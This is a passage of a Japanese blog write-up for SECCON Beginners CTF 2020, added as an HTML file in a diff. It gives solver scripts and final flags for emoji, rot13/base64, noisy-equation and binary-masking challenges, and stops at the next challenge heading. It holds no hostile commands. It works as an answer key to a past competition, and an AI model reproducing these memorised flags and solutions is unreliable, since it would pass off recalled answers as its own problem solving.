@@ -1,0 +1,1057 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+		<title>SECCON Beginners CTF 2020 write up &middot; kuzushikiのぺーじ</title>
+		<link rel="canonical" href="https://kuzushiki.github.io/post/seccon_begginers2020/">
+		<link rel="stylesheet" type="text/css" href="https://kuzushiki.github.io/css/main.css" />
+		
+	</head>
+	<body>
+		<a id="title" href="https://kuzushiki.github.io/" title="kuzushikiのぺーじ">
+			
+				<img id="logo" alt="Logo" src="https://kuzushiki.github.io/images/logo.png" />
+			
+			
+				<h1>kuzushikiのぺーじ</h1>
+			
+		</a>
+		
+			<h4>セキュリティに関することを書きたいですね</h4>
+		
+		<div id="social">
+			
+			
+			
+			<a href="https://github.com/kuzushiki" title="Github">
+				<img alt="GitHub" height="64px" width="64px" src="https://kuzushiki.github.io/images/github.svg" />
+			</a>
+			
+			
+			
+			<a href="https://twitter.com/kuzu7shiki" title="Twitter">
+				<img alt="Twitter" height="64px" width="64px" src="https://kuzushiki.github.io/images/twitter.svg" />
+			</a>
+			
+			
+                        
+		</div>
+		<div class="links">
+			<a href="https://kuzushiki.github.io/">Home</a>
+			
+				<a href="https://kuzushiki.github.io/post/">Archive</a>
+			
+			
+				
+			
+				
+					<a href="https://kuzushiki.github.io/pages/resume/">Résumé</a>
+				
+			
+		</div>
+
+	<div class="postBody">
+		<div class="post">
+			<h1>SECCON Beginners CTF 2020 write up</h1>
+			<span class="post-meta">Mon, May 25, 2020 - Read in 12 Min</span>
+			<div class="content">
+			<nav id="TableOfContents">
+  <ul>
+    <li><a href="#emoemoencode-misc-53-pts-471-solves">emoemoencode (Misc, 53 pts, 471 solves)</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#rb-crypto-52-pts-500-solves">R&amp;B (Crypto, 52 pts, 500 solves)</a></li>
+    <li><a href="#noisy-equations-crypto-261-pts-76-solves">Noisy equations (Crypto, 261 pts, 76 solves)</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#mask-reversing-62-pts-354-solves">mask (Reversing, 62 pts, 354 solves)</a></li>
+    <li><a href="#yakisoba-reversing-156-pts-144-solves">yakisoba (Reversing, 156 pts, 144 solves)</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#spy-web-55-pts-441-solves">Spy (Web, 55 pts, 441 solves)</a></li>
+    <li><a href="#tweetstore-web-150-pts-150-solves">Tweetstore (Web, 150 pts, 150 solves)</a></li>
+    <li><a href="#unzip-web-188-pts-118-solves">unzip (Web, 188 pts, 118 solves)</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#beginners-stack-pwn-188-pts-118-solves">Beginner&rsquo;s Stack (Pwn, 188 pts, 118 solves)</a></li>
+    <li><a href="#beginners-heap-pwn-293-pts-62-solves">Beginner&rsquo;s Heap (Pwn, 293 pts, 62 solves)</a></li>
+    <li><a href="#感想">感想</a></li>
+  </ul>
+</nav>
+			<h1 id="seccon-beginners-ctf-2020に参加しました">SECCON Beginners CTF 2020に参加しました！</h1>
+<p>(team: KO-GEKI-SHA)</p>
+<p>今回は会社の同期を誘って参加しました。自分は1404点を入れ、順位は66位 / 1009チーム(0点は除く)でした。</p>
+<p><img src="https://user-images.githubusercontent.com/50363796/82816617-6e5d0000-9ed6-11ea-98f5-b4bd7c8115c6.png" alt="FireShot Capture 017 - Beginners CTF 2020 - score beginners seccon jp"></p>
+<p><img src="https://user-images.githubusercontent.com/50363796/82816635-76b53b00-9ed6-11ea-9a2d-d9d97ae0aef4.png" alt="FireShot Capture 016 - Beginners CTF 2020 - score beginners seccon jp"></p>
+<p>だいぶ出遅れてしまいましたが，write upを書いていきます！</p>
+<h1 id="misc">Misc</h1>
+<h2 id="emoemoencode-misc-53-pts-471-solves">emoemoencode (Misc, 53 pts, 471 solves)</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Do you know emo-emo-encode?
+</code></pre></div><p>以下の暗号文が得られます。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">🍣🍴🍦🌴🍢🍻🍳🍴🍥🍧🍡🍮🌰🍧🍲🍡🍰🍨🍹🍟🍢🍹🍟🍥🍭🌰🌰🌰🌰🌰🌰🍪🍩🍽
+</code></pre></div><p>食べ物ばかりで美味しそうですね。</p>
+<p>「食べ物」に関連する絵文字の文字コードは近そうです。
+暗号文に使われている文字の文字コードからある数を引くとフラグになるのではないでしょうか？</p>
+<p>先頭の文字コードが0になるようにしてから，1ずつ足していきます。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;emoemoencode.txt&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
+    data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range (<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1000</span>):
+    dec <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> data:
+        <span style="color:#66d9ef">try</span>:
+            dec<span style="color:#f92672">+=</span> chr(ord(c) <span style="color:#f92672">-</span> ord(data[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">+</span> i)
+        <span style="color:#66d9ef">except</span>:
+            <span style="color:#66d9ef">continue</span>
+    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;ctf&#39;</span> <span style="color:#f92672">in</span> dec:
+        <span style="color:#66d9ef">print</span>(dec)
+        exit()
+</code></pre></div><p>フラグが得られました！</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~/ctf/ctf4b-2020/misc$ python3 emo.py 
+ctf4b<span style="color:#f92672">{</span>stegan0graphy_by_em000000ji<span style="color:#f92672">}</span>
+</code></pre></div><p><code>ctf4b{stegan0graphy_by_em000000ji}</code></p>
+<h1 id="crypto">Crypto</h1>
+<h2 id="rb-crypto-52-pts-500-solves">R&amp;B (Crypto, 52 pts, 500 solves)</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Do you like rhythm and blues?
+</code></pre></div><p>以下のソースコードが得られます。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> os <span style="color:#f92672">import</span> getenv
+
+
+FLAG <span style="color:#f92672">=</span> getenv(<span style="color:#e6db74">&#34;FLAG&#34;</span>)
+FORMAT <span style="color:#f92672">=</span> getenv(<span style="color:#e6db74">&#34;FORMAT&#34;</span>)
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rot13</span>(s):
+    <span style="color:#75715e"># snipped</span>
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">base64</span>(s):
+    <span style="color:#75715e"># snipped</span>
+
+
+<span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> FORMAT:
+    <span style="color:#66d9ef">if</span> t <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;R&#34;</span>:
+        FLAG <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;R&#34;</span> <span style="color:#f92672">+</span> rot13(FLAG)
+    <span style="color:#66d9ef">if</span> t <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;B&#34;</span>:
+        FLAG <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">+</span> base64(FLAG)
+
+<span style="color:#66d9ef">print</span>(FLAG)
+</code></pre></div><p>フラグを<code>rot13</code>と<code>base64</code>を用いて暗号化しています。</p>
+<p><code>rot13</code>で暗号化したら<code>R</code>, <code>base64</code>で暗号化したら<code>B</code>が先頭につくようです。</p>
+<p>復号するスクリプトを書きました。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> codecs
+
+<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;encoded_flag&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
+    data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+
+<span style="color:#66d9ef">while</span> (data[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;R&#39;</span> <span style="color:#f92672">or</span> data[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;B&#39;</span>):
+    <span style="color:#66d9ef">if</span> data[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;R&#39;</span>:
+        data <span style="color:#f92672">=</span> codecs<span style="color:#f92672">.</span>decode(data[<span style="color:#ae81ff">1</span>:], <span style="color:#e6db74">&#39;rot13&#39;</span>)
+    <span style="color:#66d9ef">elif</span> data[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;B&#39;</span>:
+        data <span style="color:#f92672">=</span> codecs<span style="color:#f92672">.</span>decode(data[<span style="color:#ae81ff">1</span>:]<span style="color:#f92672">.</span>encode(), <span style="color:#e6db74">&#39;base64_codec&#39;</span>)
+    <span style="color:#66d9ef">try</span>:
+        data <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>decode()
+    <span style="color:#66d9ef">except</span>:
+        <span style="color:#66d9ef">pass</span>
+<span style="color:#66d9ef">print</span>(data)
+</code></pre></div><p>実行すると，フラグが得られました。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~/ctf/ctf4b-2020/crypto/r_and_b$ python3 rb.py 
+ctf4b<span style="color:#f92672">{</span>rot_base_rot_base_rot_base_base<span style="color:#f92672">}</span>
+</code></pre></div><p><code>ctf4b{rot_base_rot_base_rot_base_base}</code></p>
+<h2 id="noisy-equations-crypto-261-pts-76-solves">Noisy equations (Crypto, 261 pts, 76 solves)</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">noise hides flag.
+</code></pre></div><p>指定されているサーバにアクセスすると，大量の数値が返ってきます。</p>
+<p>また，ソースコードも添付されています。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> os <span style="color:#f92672">import</span> getenv
+<span style="color:#f92672">from</span> time <span style="color:#f92672">import</span> time
+<span style="color:#f92672">from</span> random <span style="color:#f92672">import</span> getrandbits, seed
+
+
+FLAG <span style="color:#f92672">=</span> getenv(<span style="color:#e6db74">&#34;FLAG&#34;</span>)<span style="color:#f92672">.</span>encode()
+SEED <span style="color:#f92672">=</span> getenv(<span style="color:#e6db74">&#34;SEED&#34;</span>)<span style="color:#f92672">.</span>encode()
+
+L <span style="color:#f92672">=</span> <span style="color:#ae81ff">256</span>
+N <span style="color:#f92672">=</span> len(FLAG)
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dot</span>(A, B):
+    <span style="color:#66d9ef">assert</span> len(A) <span style="color:#f92672">==</span> len(B)
+    <span style="color:#66d9ef">return</span> sum([a <span style="color:#f92672">*</span> b <span style="color:#66d9ef">for</span> a, b <span style="color:#f92672">in</span> zip(A, B)])
+
+coeffs <span style="color:#f92672">=</span> [[getrandbits(L) <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(N)] <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(N)]
+
+seed(SEED)
+
+answers <span style="color:#f92672">=</span> [dot(coeff, FLAG) <span style="color:#f92672">+</span> getrandbits(L) <span style="color:#66d9ef">for</span> coeff <span style="color:#f92672">in</span> coeffs]
+
+<span style="color:#66d9ef">print</span>(coeffs)
+<span style="color:#66d9ef">print</span>(answers)
+</code></pre></div><p>乱数で行列を作り，フラグの文字との内積を計算し，最後に乱数を足しているのがわかります。</p>
+<p>また，行列に用いられる乱数はランダムですが，最後に足す乱数はシードが固定なので値が一定なこともわかります。</p>
+<p>サーバに２回接続し，その結果の差分を取ることで，最後に足す乱数を消すことができそうです。</p>
+<p>すると連立１次方程式の形になるので，逆行列を求めて解くことができます。</p>
+<p>復号するスクリプトを書きました。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># 行列の計算に用いる</span>
+<span style="color:#f92672">import</span> numpy <span style="color:#f92672">as</span> np
+
+<span style="color:#75715e"># あまりにも長いため割愛</span>
+coeffs1 <span style="color:#f92672">=</span> 
+answer1 <span style="color:#f92672">=</span> 
+coeffs2 <span style="color:#f92672">=</span>
+answer2 <span style="color:#f92672">=</span>
+
+ary <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>array(coeffs1)<span style="color:#f92672">-</span> np<span style="color:#f92672">.</span>array(coeffs2)
+ans <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>array(answer1) <span style="color:#f92672">-</span> np<span style="color:#f92672">.</span>array(answer2)
+ary <span style="color:#f92672">=</span> ary<span style="color:#f92672">.</span>astype(np<span style="color:#f92672">.</span>float64)
+flag <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>dot(np<span style="color:#f92672">.</span>linalg<span style="color:#f92672">.</span>inv(ary),ans)
+
+flag_list <span style="color:#f92672">=</span> flag<span style="color:#f92672">.</span>tolist()
+
+<span style="color:#66d9ef">for</span> a <span style="color:#f92672">in</span> flag_list:
+    <span style="color:#66d9ef">print</span>(chr(round(a)),end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;&#39;</span>)
+</code></pre></div><p>実行すると，フラグが得られました。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~/ctf/ctf4b-2020/crypto/noisy-equations$ python3 solve2.py 
+ctf4b<span style="color:#f92672">{</span>r4nd0m_533d_15_n3c3554ry_f0r_53cur17y<span style="color:#f92672">}</span>
+</code></pre></div><p><code>ctf4b{r4nd0m_533d_15_n3c3554ry_f0r_53cur17y}</code></p>
+<h1 id="reversing">Reversing</h1>
+<h2 id="mask-reversing-62-pts-354-solves">mask (Reversing, 62 pts, 354 solves)</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">The price of mask goes down. So does the point (it&#39;s easy)!
+</code></pre></div><p>バイナリが配られるので，実行してみます。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~/ctf/ctf4b-2020/rev$ ./mask
+Usage: ./mask <span style="color:#f92672">[</span>FLAG<span style="color:#f92672">]</span>
+kali@kali:~/ctf/ctf4b-2020/rev$ ./mask flag
+Putting on masks...
+ddae
+bhac
+Wrong FLAG. Try again.
+kali@kali:~/ctf/ctf4b-2020/rev$ ./mask flag<span style="color:#f92672">{}</span>
+Putting on masks...
+ddaequ
+bhacki
+Wrong FLAG. Try again.
+</code></pre></div><p>どうやら入力した文字を一文字ずつ変換しているようです。</p>
+<p><code>ltrace</code>で比較などを行っていないか調べてみます。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~/ctf/ctf4b-2020/rev$ ltrace ./mask flag
+strcpy<span style="color:#f92672">(</span>0x7fff2cd94700, <span style="color:#e6db74">&#34;flag&#34;</span><span style="color:#f92672">)</span>                                                                                        <span style="color:#f92672">=</span> 0x7fff2cd94700
+strlen<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;flag&#34;</span><span style="color:#f92672">)</span>                                                                                                        <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>
+puts<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Putting on masks...&#34;</span>Putting on masks...
+<span style="color:#f92672">)</span>                                                                                           <span style="color:#f92672">=</span> <span style="color:#ae81ff">20</span>
+puts<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;ddae&#34;</span>ddae
+<span style="color:#f92672">)</span>                                                                                                          <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>
+puts<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;bhac&#34;</span>bhac
+<span style="color:#f92672">)</span>                                                                                                          <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>
+strcmp<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;ddae&#34;</span>, <span style="color:#e6db74">&#34;atd4`qdedtUpetepqeUdaaeUeaqau&#34;</span><span style="color:#f92672">)</span>                                                                       <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
+puts<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Wrong FLAG. Try again.&#34;</span>Wrong FLAG. Try again.
+<span style="color:#f92672">)</span>                                                                                        <span style="color:#f92672">=</span> <span style="color:#ae81ff">23</span>
++++ exited <span style="color:#f92672">(</span>status 0<span style="color:#f92672">)</span> +++
+</code></pre></div><p>以下の部分で比較していることがわかります。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">strcmp<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;ddae&#34;</span>, <span style="color:#e6db74">&#34;atd4`qdedtUpetepqeUdaaeUeaqau&#34;</span><span style="color:#f92672">)</span>
+</code></pre></div><p>一致するような入力を総当りで求めます。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> subprocess
+<span style="color:#f92672">import</span> string
+
+enc <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;atd4`qdedtUpetepqeUdaaeUeaqau&#34;</span>
+flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ctf4b{&#39;</span>
+<span style="color:#66d9ef">while</span> flag[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;}&#39;</span>:
+    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>printable:
+        tmp <span style="color:#f92672">=</span> flag <span style="color:#f92672">+</span> c
+
+        proc <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>run([<span style="color:#e6db74">&#39;./mask&#39;</span>, tmp], check<span style="color:#f92672">=</span>True, stdout<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE)
+        ans <span style="color:#f92672">=</span> proc<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>decode()
+        ans <span style="color:#f92672">=</span> ans<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">1</span>]
+        <span style="color:#66d9ef">if</span> ans <span style="color:#f92672">in</span> enc:
+            flag <span style="color:#f92672">=</span> tmp
+            <span style="color:#66d9ef">print</span>(flag)
+            <span style="color:#66d9ef">break</span>
+</code></pre></div><p>実行しても，フラグが得られませんでした。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~/ctf/ctf4b-2020/rev$ python3 mask_test.py 
+ctf4b<span style="color:#f92672">{</span>d
+ctf4b<span style="color:#f92672">{</span>de
+ctf4b<span style="color:#f92672">{</span>ded
+ctf4b<span style="color:#f92672">{</span>dedt
+ctf4b<span style="color:#f92672">{</span>dedtU
+ctf4b<span style="color:#f92672">{</span>dedtUp
+ctf4b<span style="color:#f92672">{</span>dedtUpe
+ctf4b<span style="color:#f92672">{</span>dedtUpet
+ctf4b<span style="color:#f92672">{</span>dedtUpete
+ctf4b<span style="color:#f92672">{</span>dedtUpetep
+ctf4b<span style="color:#f92672">{</span>dedtUpetepq
+ctf4b<span style="color:#f92672">{</span>dedtUpetepqe
+ctf4b<span style="color:#f92672">{</span>dedtUpetepqeU
+ctf4b<span style="color:#f92672">{</span>dedtUpetepqeUd
+ctf4b<span style="color:#f92672">{</span>dedtUpetepqeUda
+ctf4b<span style="color:#f92672">{</span>dedtUpetepqeUdaa
+ctf4b<span style="color:#f92672">{</span>dedtUpetepqeUdaae
+ctf4b<span style="color:#f92672">{</span>dedtUpetepqeUdaaeU
+ctf4b<span style="color:#f92672">{</span>dedtUpetepqeUdaaeUe
+ctf4b<span style="color:#f92672">{</span>dedtUpetepqeUdaaeUea
+ctf4b<span style="color:#f92672">{</span>dedtUpetepqeUdaaeUeaq
+ctf4b<span style="color:#f92672">{</span>dedtUpetepqeUdaaeUeaqa
+ctf4b<span style="color:#f92672">{</span>dedtUpetepqeUdaaeUeaqau
+</code></pre></div><p>どうやらまだ続きがありそうです。</p>
+<p>得られた値で，もう一度<code>ltrace</code>をおこないます。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~/ctf/ctf4b-2020/rev$ ltrace ./mask ctf4b<span style="color:#f92672">{</span>dedtUpetepqeUdaaeUeaqau
+strcpy<span style="color:#f92672">(</span>0x7ffd70c6c710, <span style="color:#e6db74">&#34;ctf4b{dedtUpetepqeUdaaeUeaqau&#34;</span><span style="color:#f92672">)</span>                                                               <span style="color:#f92672">=</span> 0x7ffd70c6c710
+strlen<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;ctf4b{dedtUpetepqeUdaaeUeaqau&#34;</span><span style="color:#f92672">)</span>                                                                               <span style="color:#f92672">=</span> <span style="color:#ae81ff">29</span>
+puts<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Putting on masks...&#34;</span>Putting on masks...
+<span style="color:#f92672">)</span>                                                                                           <span style="color:#f92672">=</span> <span style="color:#ae81ff">20</span>
+puts<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;atd4`qdedtUpetepqeUdaaeUeaqau&#34;</span>atd4<span style="color:#e6db74">`</span>qdedtUpetepqeUdaaeUeaqau
+<span style="color:#f92672">)</span>                                                                                 <span style="color:#f92672">=</span> <span style="color:#ae81ff">30</span>
+puts<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;c`b bk`a``A`a`a`aaA`aaaAaaaaa&#34;</span>c<span style="color:#e6db74">`</span>b bk<span style="color:#e6db74">`</span>a<span style="color:#e6db74">``</span>A<span style="color:#e6db74">`</span>a<span style="color:#e6db74">`</span>a<span style="color:#e6db74">`</span>aaA<span style="color:#e6db74">`</span>aaaAaaaaa
+<span style="color:#f92672">)</span>                                                                                 <span style="color:#f92672">=</span> <span style="color:#ae81ff">30</span>
+strcmp<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;atd4`qdedtUpetepqeUdaaeUeaqau&#34;</span>, <span style="color:#e6db74">&#34;atd4`qdedtUpetepqeUdaaeUeaqau&#34;</span><span style="color:#f92672">)</span>                                              <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+strcmp<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;c`b bk`a``A`a`a`aaA`aaaAaaaaa&#34;</span>, <span style="color:#e6db74">&#34;c`b bk`kj`KbababcaKbacaKiacki&#34;</span><span style="color:#f92672">)</span>                                              <span style="color:#f92672">=</span> -10
+puts<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Wrong FLAG. Try again.&#34;</span>Wrong FLAG. Try again.
+<span style="color:#f92672">)</span>                                                                                        <span style="color:#f92672">=</span> <span style="color:#ae81ff">23</span>
++++ exited <span style="color:#f92672">(</span>status 0<span style="color:#f92672">)</span> +++
+</code></pre></div><p>別の値とも比較していることがわかりました。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">strcmp<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;c`b bk`a``A`a`a`aaA`aaaAaaaaa&#34;</span>, <span style="color:#e6db74">&#34;c`b bk`kj`KbababcaKbacaKiacki&#34;</span><span style="color:#f92672">)</span>
+</code></pre></div><p>今度はここも一致するようにスクリプトを修正します。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> subprocess
+<span style="color:#f92672">import</span> string
+
+enc1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;atd4`qdedtUpetepqeUdaaeUeaqau&#34;</span>
+enc2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;c`b bk`kj`KbababcaKbacaKiacki&#34;</span>
+<span style="color:#75715e"># flag = &#39;ctf4b{&#39;</span>
+flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ctf4b{&#39;</span>
+<span style="color:#66d9ef">while</span> flag[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;}&#39;</span>:
+    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>printable:
+        tmp <span style="color:#f92672">=</span> flag <span style="color:#f92672">+</span> c
+
+        proc <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>run([<span style="color:#e6db74">&#39;./mask&#39;</span>, tmp], check<span style="color:#f92672">=</span>True, stdout<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE)
+        ans <span style="color:#f92672">=</span> proc<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>decode()
+        ans1 <span style="color:#f92672">=</span> ans<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">1</span>]
+        ans2 <span style="color:#f92672">=</span> ans<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">2</span>]
+        <span style="color:#66d9ef">if</span> (ans1 <span style="color:#f92672">in</span> enc1) <span style="color:#f92672">and</span> (ans2 <span style="color:#f92672">in</span> enc2):
+            flag <span style="color:#f92672">=</span> tmp
+            <span style="color:#66d9ef">print</span>(flag)
+            <span style="color:#66d9ef">break</span>
+</code></pre></div><p>実行すると，フラグが得られました！</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~/ctf/ctf4b-2020/rev$ python3 mask_solve.py
+ctf4b<span style="color:#f92672">{</span>d
+ctf4b<span style="color:#f92672">{</span><span style="color:#66d9ef">do</span>
+ctf4b<span style="color:#f92672">{</span>don
+ctf4b<span style="color:#f92672">{</span>dont
+ctf4b<span style="color:#f92672">{</span>dont_
+ctf4b<span style="color:#f92672">{</span>dont_r
+ctf4b<span style="color:#f92672">{</span>dont_re
+ctf4b<span style="color:#f92672">{</span>dont_rev
+ctf4b<span style="color:#f92672">{</span>dont_reve
+ctf4b<span style="color:#f92672">{</span>dont_rever
+ctf4b<span style="color:#f92672">{</span>dont_revers
+ctf4b<span style="color:#f92672">{</span>dont_reverse
+ctf4b<span style="color:#f92672">{</span>dont_reverse_
+ctf4b<span style="color:#f92672">{</span>dont_reverse_f
+ctf4b<span style="color:#f92672">{</span>dont_reverse_fa
+ctf4b<span style="color:#f92672">{</span>dont_reverse_fac
+ctf4b<span style="color:#f92672">{</span>dont_reverse_face
+ctf4b<span style="color:#f92672">{</span>dont_reverse_face_
+ctf4b<span style="color:#f92672">{</span>dont_reverse_face_m
+ctf4b<span style="color:#f92672">{</span>dont_reverse_face_ma
+ctf4b<span style="color:#f92672">{</span>dont_reverse_face_mas
+ctf4b<span style="color:#f92672">{</span>dont_reverse_face_mask
+ctf4b<span style="color:#f92672">{</span>dont_reverse_face_mask<span style="color:#f92672">}</span>
+</code></pre></div><p><code>ctf4b{dont_reverse_face_mask}</code></p>
+<p>他の方のwriteupを拝見しましたが，静的解析したほうが簡単そうでした。</p>
+<h2 id="yakisoba-reversing-156-pts-144-solves">yakisoba (Reversing, 156 pts, 144 solves)</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Would you like to have a yakisoba code?
+
